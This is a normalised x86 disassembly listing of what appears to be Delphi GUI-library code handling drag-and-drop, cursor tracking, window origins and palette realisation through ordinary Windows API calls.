fdivp st1
fstp [ ecx + 0x28 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_439adc
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_439f1c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_43a0c1
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x9b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_403420
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_403420
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4392e0
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_439dac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4391c8
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax esi
call sub_4423cc
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_4124bc
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_43b6e4
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x48 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_4033b0
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x48 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x38 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x44 ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_4124bc
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
sub_43a0e0
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
mov ecx [ rw-data ]
mov si 0xffbe
call sub_403420
mov ebx eax
sub_43a154
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x2 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_43a420
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_43a3ae
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x1
mov eax [ rw-data ]
mov dl [ ebp - 0x1 ]
mov [ eax + 0x1c ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_439020
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4033d4
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4 ] 0x0
sete al
mov [ ebx + 0x6c ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x6 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x18 ]
mov [ ebp - 0x6 ] edx
jmp r-xdata
mov [ ebp - 0x2 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
push ebp
call sub_43a0e0
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x0
je r-xdata
mov al 0x1
call sub_439a0c
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_443fe8
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a3b5
mov eax [ rw-data ]
call sub_403224
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_452980
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x6 ]
push eax
mov al [ ebp - 0x2 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xa ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_43cd98
jmp r-xdata
mov edx [ eax + 0x220 ]
cmp edx [ ebx + 0x38 ]
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_4398d8
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0xa ] edx
xor edx edx
mov [ ebp - 0x6 ] edx
xor edx edx
call sub_4565ec
sub_43a3b5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4033b0
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_403224
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_4033b0
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
sub_43a444
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_438aac
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_43a478
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_43a444
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax ebp
call sub_43b710
lea edx [ esp + 0x4 ]
mov ecx ebx
mov eax ebp
call sub_43fcb8
test eax eax
je r-xdata
mov esi eax
sub_43a4c0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_4137bc
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebx ] eax
sub_43a4e8
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_413a5c
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_403224
xor eax eax
mov [ ebx ] eax
sub_43a508
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43a538
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_413c84
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43a5e8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413ce8
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_43a5c1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_43a774
call sub_403a44
call sub_403a44
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_413918
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_41d3cc
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_43a5f4
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_413c84
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43a692
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a699
mov eax [ rw-data ]
call sub_413ce8
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_43a66a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_43a774
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_41d428
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_413918
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_41d3cc
test al al
je r-xdata
sub_43a6a0
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov eax esi
call sub_43a774
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41cea4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_43a6cc
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d5ac
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_41d5b0
mov eax [ ebp - 0x4 ]
call sub_43a7c0
mov eax [ rw-data ]
call sub_413c84
mov ebx eax
xor eax eax
push ebp
push sub_43a751
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4137bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413ce8
retn
call sub_43a538
sub_43a774
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_41d5b0
mov edx ebx
mov eax [ rw-data ]
call sub_413c98
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_43a7c0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_43c228
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_43a7ec
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4031f4
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_43a828
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_413fa0
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_43a870
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_43a92c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43a9f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43aa00
lea eax [ ebp - 0x1c ]
call sub_403f5c
lea eax [ ebp - 0x8 ]
call sub_403f5c
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_403420
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_44b0b4
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408b70
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_403fb0
sub_43aa1c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43aa83
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_448180
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_43bbcc
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033d4
mov edx [ eax + 0x64 ]
pop eax
call sub_404368
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43aa8a
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
mov al 0x1
sub_43aa90
push ebx
mov ebx eax
mov eax ebx
call sub_4481a8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033d4
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43aac4
push ebx
mov ebx eax
mov eax ebx
call sub_4481f8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033d4
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call sub_404368
je r-xdata
mov al 0x1
pop ebx
retn
sub_43aafc
push ebx
mov ebx eax
mov eax ebx
call sub_448234
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033d4
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43ab30
push ebx
mov ebx eax
mov eax ebx
call sub_419ce0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43ab58
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43bbfc
sub_43ab78
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_43ab98
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_403fb0
sub_43abbc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_43baec
sub_43abdc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_43ac08
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033d4
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x158 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033d4
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x154 ]
call sub_404368
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033d4
mov al [ edi + 0x70 ]
cmp al [ esi + 0x150 ]
je r-xdata
mov al 0x1
sub_43ac6c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43b548
sub_43ac8c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43b534
sub_43acac
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x150 ] bl
sub_43accc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4193f0
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c2f0
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_43bc7c
mov al [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43a7ec
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_43cb58
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x9a ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x150 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_43ada4
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_403598
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_45a504
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403580
push edi
xor ecx ecx
mov edx 0xb039
call sub_43cd98
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx esp
mov eax edi
call sub_43b56c
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_403420
xor eax eax
mov [ edi + 0xa0 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_403224
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_403224
mov eax [ edi + 0x68 ]
call sub_403224
mov eax [ edi + 0x64 ]
call sub_4086e0
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41943c
test bl bl
jle r-xdata
sub_43ae70
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_43ae98
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebp eax
xor ebx ebx
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov si 0xffd7
call sub_403420
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
mov al [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push edi
push esi
call SelectPalette
mov edi eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push edi
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax ebp
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43af20
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x61 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x61 ] al
mov eax ebx
call sub_43b220
sub_43af40
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_403224
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_43dbb4
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403420
mov edx ebx
mov eax edi
call sub_4194c0
mov eax ebx
mov si 0xffd9
call sub_403420
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_43b008
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_419850
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_43cd98
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
